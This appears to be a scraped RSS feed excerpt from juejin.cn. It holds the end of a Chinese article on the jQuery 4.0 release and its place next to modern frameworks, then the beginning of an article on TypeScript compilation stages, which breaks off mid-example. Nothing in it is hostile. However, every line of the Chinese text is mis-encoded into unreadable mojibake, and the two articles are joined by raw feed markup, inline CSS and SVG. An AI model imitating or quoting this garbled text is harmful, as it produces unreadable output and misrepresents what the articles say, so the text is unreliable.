<p>å°½ç®¡å¦‚æ­¤ï¼ŒjQueryä¾ç„¶æœ‰å…¶ç‹¬ç‰¹çš„é­…åŠ›ã€‚å®ƒç®€å•æ˜“ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†DOMæ“ä½œå’Œäº‹ä»¶æ—¶ï¼Œä¾ç„¶èƒ½ä¸ºå¾ˆå¤šå¼€å‘è€…æä¾›ä¾¿åˆ©ã€‚ä»è¿™ä¸ªè§’åº¦çœ‹ï¼ŒjQueryæ˜¯å¦ä¼šé€æ¸è½¬å˜ä¸ºä¸€ç§â€œå·¥å…·â€è€Œéå¿…éœ€å“ï¼Œæˆ–è®¸æ‰æ˜¯æœªæ¥çš„æ–¹å‘ã€‚</p>
<h3 data-id="heading-10">å‰ç«¯ç”Ÿæ€çš„å¿«é€Ÿå˜é©</h3>
<p>åœ¨å¿«é€Ÿå˜åŒ–çš„å‰ç«¯ç”Ÿæ€ä¸­ï¼ŒjQueryçš„æœªæ¥ä¼¼ä¹é¢ä¸´æŒ‘æˆ˜ã€‚é¢å¯¹Reactã€Vueç­‰ç°ä»£æ¡†æ¶çš„å´›èµ·ï¼Œå¾ˆå¤šå¼€å‘è€…å¼€å§‹è´¨ç–‘jQueryçš„ä½¿ç”¨ä»·å€¼ã€‚æœ‰è¯„è®ºæŒ‡å‡ºï¼ŒjQueryæ›¾ç»æ˜¯â€œè®©ç½‘é¡µå¼€å‘å˜å¾—æ›´è½»æ¾â€çš„å·¥å…·ï¼Œå¦‚ä»Šå´é€æ¸è¢«æ›´é«˜æ•ˆçš„è§£å†³æ–¹æ¡ˆå–ä»£ã€‚</p>
<p>ä¸è¿‡ï¼Œæˆ‘ä»¬ä¸èƒ½å¿½è§†jQueryçš„å†å²è´¡çŒ®ã€‚å®ƒå¸®åŠ©æ— æ•°å¼€å‘è€…åœ¨IEæ—¶ä»£æ¸¡è¿‡éš¾å…³ï¼Œç°åœ¨ä»ç„¶åœ¨ä¸€äº›è€æ—§é¡¹ç›®ä¸­å‘æŒ¥ç€ä½œç”¨ã€‚é‚£ä¹ˆï¼ŒjQueryåœ¨æœªæ¥çš„å®šä½åˆ°åº•æ˜¯æ€æ ·çš„å‘¢ï¼Ÿæ˜¯ç»§ç»­ä½œä¸ºä¸€ç§â€œè¿‡æ¸¡â€å·¥å…·ï¼Œè¿˜æ˜¯éœ€è¦ä¸ºæ–°æ—¶ä»£çš„å¼€å‘è€…é‡æ–°å®šä¹‰ï¼Ÿ</p>
<h3 data-id="heading-11">å…³é”®æŠ€æœ¯è¶‹åŠ¿</h3>
<p>åœ¨è®¨è®ºjQueryçš„æœªæ¥æ—¶ï¼Œå‡ ä¸ªæŠ€æœ¯è¶‹åŠ¿ä¹Ÿå€¼å¾—å…³æ³¨ã€‚é¦–å…ˆæ˜¯ESMï¼ˆECMAScript Modulesï¼‰çš„æ¨å¹¿ï¼Œè¿™ä½¿å¾—æ¨¡å—åŒ–å¼€å‘å˜å¾—æ›´åŠ æ ‡å‡†åŒ–ã€‚å…¶æ¬¡æ˜¯åŸç”ŸåŠŸèƒ½çš„å´›èµ·ï¼Œå¾ˆå¤šæ›¾ç»éœ€è¦ä¾èµ–jQueryå®ç°çš„åŠŸèƒ½ï¼Œç°åœ¨éƒ½å¯ä»¥ç”¨åŸç”ŸJSè½»æ¾å®ç°ã€‚</p>
<p>æ­¤å¤–ï¼Œéšç€å‰ç«¯æ¡†æ¶çš„å¿«é€Ÿè¿­ä»£ï¼Œå¼€å‘è€…ä»¬ä¹Ÿåœ¨å¯»æ‰¾æ›´è½»é‡çš„è§£å†³æ–¹æ¡ˆã€‚åœ¨è¿™ç§èƒŒæ™¯ä¸‹ï¼ŒjQueryæ˜¯å¦ä¼šé€æ¸è¢«è§†ä¸ºâ€œæ—§æ—¶ä»£çš„äº§ç‰©â€ï¼Ÿæˆ‘ä»¬éœ€è¦è®¤çœŸæ€è€ƒè¿™ä¸ªé—®é¢˜ã€‚</p>
<h3 data-id="heading-12">æ‰¾åˆ°ä¼ ç»Ÿä¸æ–°å…´æŠ€æœ¯ä¹‹é—´çš„å¹³è¡¡</h3>
<p>å¯¹äºå¼€å‘è€…æ¥è¯´ï¼Œé¢å¯¹ä¼ ç»ŸæŠ€æœ¯ä¸æ–°å…´æŠ€æœ¯çš„ç¢°æ’ï¼Œå¦‚ä½•æ‰¾åˆ°å¹³è¡¡æ˜¯ä¸€å¤§æŒ‘æˆ˜ã€‚ä¸€æ–¹é¢ï¼ŒjQueryå¸¦æ¥çš„ç®€æ´ä¸ä¾¿æ·æ˜¯æ— å¯æ›¿ä»£çš„ï¼›å¦ä¸€æ–¹é¢ï¼Œå­¦ä¹ å’ŒæŒæ¡æ–°æŠ€æœ¯ä¹Ÿæ˜¯æå‡è‡ªèº«ç«äº‰åŠ›çš„å…³é”®ã€‚</p>
<p>å»ºè®®å¤§å®¶åœ¨é€‰æ‹©ä½¿ç”¨jQueryæ—¶ï¼Œå¯ä»¥è€ƒè™‘é¡¹ç›®çš„å…·ä½“éœ€æ±‚ã€‚å¦‚æœæ˜¯ç»´æŠ¤è€é¡¹ç›®ï¼Œä½¿ç”¨jQueryæ— ç–‘æ˜¯é«˜æ•ˆçš„é€‰æ‹©ï¼›ä½†åœ¨æ–°é¡¹ç›®ä¸­ï¼Œè¯„ä¼°åŸç”ŸJSå’Œç°ä»£æ¡†æ¶çš„ä¼˜åŠ¿ï¼Œå°†ä¼šæ˜¯æ›´åŠ æ˜æ™ºçš„å†³ç­–ã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼ŒjQuery 4.0çš„å‘å¸ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªç‰ˆæœ¬å·çš„æ›´æ–°ï¼Œè€Œæ˜¯ä¸€ä¸ªæé†’ï¼šæŠ€æœ¯æ°¸è¿œåœ¨å˜åŒ–ï¼Œä½œä¸ºå¼€å‘è€…ï¼Œæˆ‘ä»¬éœ€è¦ä¸æ–­å­¦ä¹ ä¸é€‚åº”ã€‚æ— è®ºæ˜¯jQueryï¼Œè¿˜æ˜¯åŸç”ŸJSï¼Œæˆ–æ˜¯å„ç§ç°ä»£æ¡†æ¶ï¼Œé‡è¦çš„æ˜¯æ‰¾åˆ°æœ€é€‚åˆè‡ªå·±é¡¹ç›®çš„å·¥å…·ã€‚ä½ æ€ä¹ˆçœ‹å¾…è¿™ä¸ªé—®é¢˜ï¼Ÿåœ¨ä½ çš„é¡¹ç›®ä¸­ï¼ŒjQueryè¿˜æœ‰ç”¨æ­¦ä¹‹åœ°å—ï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«ä½ çš„çœ‹æ³•ï¼</p>
<h2 data-id="heading-13">æ€»ç»“ä¸è®¨è®º</h2>
<p>jQuery 4.0 çš„å‘å¸ƒæ— ç–‘æ˜¯å‰ç«¯å¼€å‘é¢†åŸŸçš„ä¸€ä¸ªæœ‰è¶£é‡Œç¨‹ç¢‘ï¼Œå€¼å¾—æˆ‘ä»¬å…³æ³¨ã€‚éšç€æŠ€æœ¯çš„å¿«é€Ÿå‘å±•ï¼ŒjQuery çš„åœ°ä½ä¼¼ä¹åœ¨é€æ¸è¢«å…¶ä»–æ–°æŠ€æœ¯æ‰€å–ä»£ï¼Œä½†å®ƒä¾ç„¶ä¿ç•™ç€ä¸€éƒ¨åˆ†å¼€å‘è€…çš„çƒ­çˆ±ã€‚æ­£å¦‚ Reddit ç”¨æˆ· u/bill_1992 æ‰€æåˆ°çš„ï¼ŒjQuery åœ¨è¿‡å»çš„è¾‰ç…Œä¸å®¹å¿½è§†ï¼Œç„¶è€Œå¦‚ä»Šï¼ŒåŸç”Ÿ JavaScript çš„å‘å±•å·²è®©å¾ˆå¤š jQuery çš„åŠŸèƒ½å˜å¾—å¤šä½™ã€‚</p>
<p>åœ¨è¿™æ¬¡æ›´æ–°ä¸­ï¼ŒjQuery ç§»é™¤äº†è®¸å¤šä¸å†å¿…è¦çš„ APIï¼Œè¿™å…¶å®åæ˜ äº†ä¸€ä¸ªè¶‹åŠ¿â€”â€”ç°ä»£æµè§ˆå™¨çš„åŸç”ŸåŠŸèƒ½å¾—åˆ°äº†æå¤§çš„æå‡ã€‚è™½ç„¶ jQuery ä»ç„¶å¯ä»¥è®© DOM æ“ä½œå˜å¾—ç®€å•ï¼Œä½†æˆ‘ä»¬ä¸å¾—ä¸é—®ï¼šåœ¨æ–°çš„é¡¹ç›®ä¸­ï¼Œä½¿ç”¨ jQuery è¿˜æœ‰å¿…è¦å—ï¼Ÿu/cheezballs æå‡ºçš„â€œä¸ºä»€ä¹ˆåœ¨ä»»ä½•æ–°é¡¹ç›®ä¸Šä½¿ç”¨è¿™ä¸ªï¼Ÿâ€ç¡®å®å€¼å¾—æˆ‘ä»¬æ·±æ€ã€‚</p>
<p>æˆ‘é¼“åŠ±å¤§å®¶åˆ†äº«ä½ ä»¬å¯¹ jQuery çš„çœ‹æ³•ä¸ä½¿ç”¨ç»éªŒã€‚ä½ æ˜¯ jQuery çš„å¿ å®ç²‰ä¸ï¼Œè¿˜æ˜¯æ—©å·²è½¬å‘å…¶ä»–æ¡†æ¶ï¼Ÿæ— è®ºæ˜¯å‡ºäºä¹ æƒ¯ï¼Œè¿˜æ˜¯å› ä¸ºå®ƒç¡®å®èƒ½è§£å†³é—®é¢˜ï¼Œå¤§å®¶çš„å£°éŸ³éƒ½å€¼å¾—è¢«å¬è§ã€‚</p>
<p>é‚£ä¹ˆï¼ŒjQuery å’Œæ–°æŠ€æœ¯å¦‚ä½•å…±å­˜å‘¢ï¼Ÿä»å¾ˆå¤šå¼€å‘è€…çš„è¯„è®ºæ¥çœ‹ï¼ŒjQuery çš„ä½œç”¨å¹¶ä¸æ˜¯å®Œå…¨æ¶ˆå¤±ï¼Œè€Œæ˜¯è½¬å˜æˆäº†ä¸€ç§å·¥å…·ï¼Œå½“æˆ‘ä»¬éœ€è¦å¿«é€Ÿå¼€å‘æˆ–å¤„ç†ç®€å•ä»»åŠ¡æ—¶ï¼Œå®ƒä¾ç„¶èƒ½æ´¾ä¸Šç”¨åœºã€‚u/LessonStudio æåˆ°äº† jQuery çš„é€šç”¨æ€§ï¼Œè¿™ä¹Ÿæ˜¯å®ƒåœ¨ä¼—å¤šæ¡†æ¶ä¸­èƒ½ç»§ç»­ç”Ÿå­˜çš„é‡è¦åŸå› ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦è€ƒè™‘çš„æ˜¯åœ¨è¿™åœºæŠ€æœ¯å˜é©ä¸­ï¼Œå“ªäº›å·¥å…·æœ€é€‚åˆä½ çš„é¡¹ç›®ï¼Ÿè¦æ ¹æ®é¡¹ç›®çš„éœ€æ±‚æ¥é€‰æ‹©å·¥å…·ã€‚å¦‚æœä½ åœ¨åšä¸€ä¸ªå°å‹é¡¹ç›®ï¼ŒjQuery å¯èƒ½ä¼šè®©ä½ çš„å¼€å‘æ›´åŠ é«˜æ•ˆï¼›è€Œåœ¨å¤§å‹åº”ç”¨ä¸­ï¼Œç°ä»£æ¡†æ¶å¦‚ Reactã€Vue æˆ– Angular å¯èƒ½ä¼šæ›´åˆé€‚ã€‚å› æ­¤ï¼Œå…³é”®åœ¨äºæ‰¾åˆ°é€‚åˆä½ é¡¹ç›®çš„æœ€ä½³è§£å†³æ–¹æ¡ˆï¼Œè€Œä¸æ˜¯ç›²ç›®è¿½éšæ½®æµã€‚</p>
<p>å±•æœ›æœªæ¥ï¼Œå‰ç«¯å¼€å‘çš„ä¸»è§’å°†ä¼šæ˜¯è°ï¼Ÿéšç€æŠ€æœ¯çš„æ›´æ–°æ¢ä»£ï¼Œæ–°çš„æ¡†æ¶å’Œå·¥å…·å±‚å‡ºä¸ç©·ã€‚è™½ç„¶ jQuery ä¾ç„¶åœ¨æŸäº›é¢†åŸŸå æœ‰ä¸€å¸­ä¹‹åœ°ï¼Œä½†æ›´å¤æ‚çš„åº”ç”¨åœºæ™¯æ­£åœ¨è¢« Reactã€Vue ç­‰æ¡†æ¶æ‰€å é¢†ã€‚å¯ä»¥è¯´ï¼Œæœªæ¥çš„å‰ç«¯å¼€å‘å°†æ˜¯ä¸€ä¸ªå¤šå…ƒåŒ–çš„æ—¶ä»£ï¼Œå„ç§å·¥å…·å¹¶å­˜ï¼Œå¼€å‘è€…éœ€è¦æ ¹æ®å…·ä½“æƒ…å†µçµæ´»é€‰æ‹©ã€‚</p>
<p>æ€»ä¹‹ï¼ŒjQuery 4.0 çš„å‘å¸ƒæé†’æˆ‘ä»¬ï¼Œä¸è®ºæŠ€æœ¯å¦‚ä½•å‘å±•ï¼Œé€‰æ‹©å·¥å…·çš„æœ€ç»ˆç›®æ ‡æ˜¯è®©å¼€å‘å˜å¾—æ›´ç®€å•ã€æ›´é«˜æ•ˆã€‚å¸Œæœ›å¤§å®¶èƒ½å¤Ÿç§¯æåˆ†äº«è‡ªå·±çš„çœ‹æ³•å’Œç»å†ï¼Œè®©æˆ‘ä»¬ä¸€èµ·æ¢è®¨è¿™ä¸ªæŠ€æœ¯è¿›æ­¥å¸¦æ¥çš„æ–°æœºé‡ï¼</p>
<hr/>
<h2 data-id="heading-14">å‚è€ƒæ¥æº</h2>
<p>[1] <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.reddit.com%2Fr%2Fprogramming%2Fcomments%2F1qfxo89%2Fjquery_40_released%2F" target="_blank" title="https://www.reddit.com/r/programming/comments/1qfxo89/jquery_40_released/" ref="nofollow noopener noreferrer">jQuery 4.0 released</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScriptå·¥ä½œæµæ·±åº¦è§£æï¼šä».tsåˆ°.jså‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7596919439019737097</link>    <guid>https://juejin.cn/post/7596919439019737097</guid>    <pubDate>2026-01-20T01:19:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596919439019737097" data-draft-id="7596687515030306842" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScriptå·¥ä½œæµæ·±åº¦è§£æï¼šä».tsåˆ°.jså‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-20T01:19:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wuhen_n"/> <meta itemprop="url" content="https://juejin.cn/user/4149996261738233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScriptå·¥ä½œæµæ·±åº¦è§£æï¼šä».tsåˆ°.jså‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4149996261738233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wuhen_n
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:19:47.000Z" title="Tue Jan 20 2026 01:19:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å½“æˆ‘ä»¬åœ¨IDEä¸­å†™ä¸‹ <code>const name: string = â€˜TypeScriptâ€™</code> æ—¶ï¼Œè¿™è¡Œä¼˜é›…çš„ç±»å‹æ³¨è§£æœ€ç»ˆå¦‚ä½•å˜æˆæµè§ˆå™¨èƒ½ç†è§£çš„ JavaScript ï¼Ÿæœ¬ç¯‡æ–‡ç« å°†æ·±å…¥TypeScriptç¼–è¯‘å™¨çš„æ ¸å¿ƒï¼Œæ­å¼€ä».tsåˆ°.jsçš„ç¥ç§˜é¢çº±ã€‚</p>
</blockquote>
<h2 data-id="heading-0">TypeScriptç¼–è¯‘å…¨æ™¯å›¾</h2>
<p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬é€šè¿‡ä¸€å¼ å®Œæ•´çš„æµç¨‹å›¾æ¥ç†è§£TypeScriptç¼–è¯‘çš„å…¨è¿‡ç¨‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20af6d69a8474308a5661b6da288eb0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3VoZW5fbg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769476786&amp;x-signature=npF6iXLDjfUaevhpX8f6nGqSpD4%3D" alt="tsåˆ°jsç¼–è¯‘å›¾.png" loading="lazy"/></p>
<h2 data-id="heading-1">tscç¼–è¯‘å…¨è¿‡ç¨‹è§£æ</h2>
<h3 data-id="heading-2">é˜¶æ®µä¸€ï¼šè§£æé˜¶æ®µï¼ˆParsingï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// è¾“å…¥ï¼šTypeScriptæºä»£ç </span>
<span class="hljs-keyword">const</span> calculate = (<span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> x + y;
</code></pre>
<h4 data-id="heading-3">æ­¥éª¤1ï¼šè¯æ³•åˆ†æï¼ˆLexical Analysisï¼‰</h4>
<p>ç¼–è¯‘å™¨é¦–å…ˆå°†æºä»£ç å­—ç¬¦ä¸²æ‹†åˆ†æˆä¸€ä¸ªä¸ªè¯æ³•å•å…ƒï¼ˆtokensï¼‰ï¼š</p>
<ul>
<li><code>const</code> (å…³é”®å­—)</li>
<li><code>calculate</code> (æ ‡è¯†ç¬¦)</li>
<li><code>=</code> (è¿ç®—ç¬¦)</li>
<li><code>(</code> (åˆ†éš”ç¬¦)</li>
<li><code>x</code> (æ ‡è¯†ç¬¦)</li>
<li><code>:</code> (åˆ†éš”ç¬¦)</li>
<li><code>number</code> (ç±»å‹å…³é”®å­—)</li>
<li>...ç­‰ç­‰</li>
</ul>
<h4 data-id="heading-4">æ­¥éª¤2ï¼šè¯­æ³•åˆ†æï¼ˆSyntax Analysisï¼‰</h4>
<p>æ ¹æ®TypeScriptè¯­æ³•è§„åˆ™ï¼Œå°†tokensç»„åˆæˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"VariableDeclaration"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"declarations"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"VariableDeclarator"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Identifier"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"calculate"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"init"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ArrowFunctionExpression"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"params"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Identifier"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"x"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"typeAnnotation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"TypeAnnotation"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"typeAnnotation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"NumberType"</span> <span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-comment">// ... ç±»ä¼¼ç»“æ„</span>
      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"returnType"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"TypeAnnotation"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"typeAnnotation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"NumberType"</span> <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"body"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">/* ... */</span> <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-5">é˜¶æ®µäºŒï¼šè¯­ä¹‰åˆ†æä¸ç±»å‹æ£€æŸ¥</h3>
<p>è¿™æ˜¯TypeScriptä¸çº¯JavaScriptç¼–è¯‘å™¨ï¼ˆå¦‚Babelï¼‰çš„æ ¸å¿ƒåŒºåˆ«æ‰€åœ¨ã€‚</p>
<h4 data-id="heading-6">æ­¥éª¤3ï¼šåˆ›å»ºç¬¦å·è¡¨ï¼ˆSymbol Tableï¼‰</h4>
<p>ç¼–è¯‘å™¨éå†ASTï¼Œæ”¶é›†æ‰€æœ‰æ ‡è¯†ç¬¦çš„ä¿¡æ¯ï¼š</p>
<ul>
<li><code>calculate</code>ï¼šå‡½æ•°ï¼Œæ¥æ”¶ä¸¤ä¸ªnumberå‚æ•°ï¼Œè¿”å›number</li>
<li><code>x</code>ï¼šå‚æ•°ï¼Œç±»å‹ä¸ºnumber</li>
<li><code>y</code>ï¼šå‚æ•°ï¼Œç±»å‹ä¸ºnumber</li>
</ul>
<h4 data-id="heading-7">æ­¥éª¤4ï¼šç±»å‹æ£€æŸ¥ï¼ˆType Checkingï¼‰</h4>
<p>åŸºäºç¬¦å·è¡¨è¿›è¡Œç±»å‹æ¨æ–­å’ŒéªŒè¯ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¤ºä¾‹1ï¼šæ­£ç¡®çš„ä»£ç </span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">5</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">10</span>;
<span class="hljs-keyword">const</span> result = a + b; <span class="hljs-comment">// âœ… ç±»å‹æ£€æŸ¥é€šè¿‡</span>

<span class="hljs-comment">// ç¤ºä¾‹2ï¼šé”™è¯¯çš„ä»£ç </span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">str</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">"hello"</span>;
